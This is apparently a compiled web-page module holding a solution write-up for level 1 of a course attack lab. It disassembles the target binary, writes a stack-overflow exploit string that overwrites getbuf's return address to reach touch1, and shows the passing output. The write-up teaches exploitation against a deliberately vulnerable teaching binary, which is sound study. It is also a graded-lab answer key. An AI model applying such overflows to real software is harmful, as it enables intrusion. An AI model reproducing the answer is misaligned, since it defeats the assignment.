import{_ as e,X as a,Y as s,a1 as i}from"./framework-9435e890.js";const n={},d=i(`<h6 id="run" tabindex="-1"><a class="header-anchor" href="#run" aria-hidden="true">#</a> Run</h6><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>objdump <span class="token parameter variable">--disassemble</span> ctarget <span class="token operator">&gt;</span> ctarget.asm
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h6 id="read-file-ctarget-asm" tabindex="-1"><a class="header-anchor" href="#read-file-ctarget-asm" aria-hidden="true">#</a> Read File <code>ctarget.asm</code></h6><div class="language-assembly line-numbers-mode" data-ext="assembly"><pre class="language-assembly"><code>...
0000000000401b28 &lt;getbuf&gt;:
  401b28:	48 83 ec 28          	sub    $0x28,%rsp
...
0000000000401b3e &lt;touch1&gt;:
...
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="write-file-phase-1-txt" tabindex="-1"><a class="header-anchor" href="#write-file-phase-1-txt" aria-hidden="true">#</a> Write File <code>phase-1.txt</code></h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
3e 1b 40 00 00 00 00 00
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="run-1" tabindex="-1"><a class="header-anchor" href="#run-1" aria-hidden="true">#</a> Run</h6><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>./hex2raw <span class="token operator">&lt;</span> phase-1.txt <span class="token operator">&gt;</span> phase-1.in
./ctarget <span class="token parameter variable">-i</span> phase-1.in
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h6 id="terminal-output" tabindex="-1"><a class="header-anchor" href="#terminal-output" aria-hidden="true">#</a> Terminal Output</h6><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Cookie: 0x3a9a6c2f
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,10),t=[d];function r(l,c){return a(),s("div",null,t)}const o=e(n,[["render",r],["__file","index.html.vue"]]);export{o as default};
